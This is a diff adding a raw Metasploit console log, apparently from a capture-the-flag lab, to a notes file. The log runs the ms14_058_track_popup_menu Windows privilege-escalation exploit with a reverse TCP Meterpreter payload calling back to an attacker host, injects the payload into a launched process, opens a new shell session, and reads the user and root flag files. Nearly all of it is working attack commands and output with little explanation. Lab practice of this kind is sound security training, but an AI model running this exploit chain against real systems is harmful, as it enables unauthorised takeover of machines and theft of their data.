@@ -44,3 +44,89 @@ Process List
 meterpreter > migrate  1832
 [*] Migrating from 3268 to 1832...
 [*] Migration completed successfully.
+
+
+
+
+
+
+
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options
+
+Module options (exploit/windows/local/ms14_058_track_popup_menu):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.204.129  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set session 1
+session => 1
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set lhost 10.10.14.15
+lhost => 10.10.14.15
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set lport 4545
+lport => 4545
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4545 
+[*] Launching notepad to host the exploit...
+[+] Process 3704 launched.
+[*] Reflectively injecting the exploit DLL into 3704...
+[*] Injecting exploit into 3704...
+[*] Exploit injected. Injecting payload into 3704...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (176195 bytes) to 10.10.10.15
+[*] Meterpreter session 2 opened (10.10.14.15:4545 -> 10.10.10.15:1031) at 2021-01-26 22:00:30 +0800
+
+meterpreter > 
+
+
+
+
+meterpreter > dir
+Listing: C:\Documents and Settings\Lakis\Desktop
+================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100444/r--r--r--  32    fil   2017-04-13 03:19:57 +0800  user.txt
+
+meterpreter > cat user.txt
+700c5dc163014e22b3e408f8703f67d1meterpreter > cd..
+[-] Unknown command: cd...
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > dir
+Listing: C:\Documents and Settings
+==================================
+
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40777/rwxrwxrwx  0     dir   2017-04-12 22:12:15 +0800  Administrator
+40777/rwxrwxrwx  0     dir   2017-04-12 21:42:38 +0800  All Users
+40777/rwxrwxrwx  0     dir   2017-04-12 21:42:38 +0800  Default User
+40777/rwxrwxrwx  0     dir   2017-04-13 03:19:46 +0800  Lakis
+40777/rwxrwxrwx  0     dir   2017-04-12 22:08:32 +0800  LocalService
+40777/rwxrwxrwx  0     dir   2017-04-12 22:08:31 +0800  NetworkService
+
+meterpreter > cd Administrator/Desktop
+meterpreter > cat root.txt
+aa4beed1c0584445ab463a6747bd06e9meterpreter > 
+
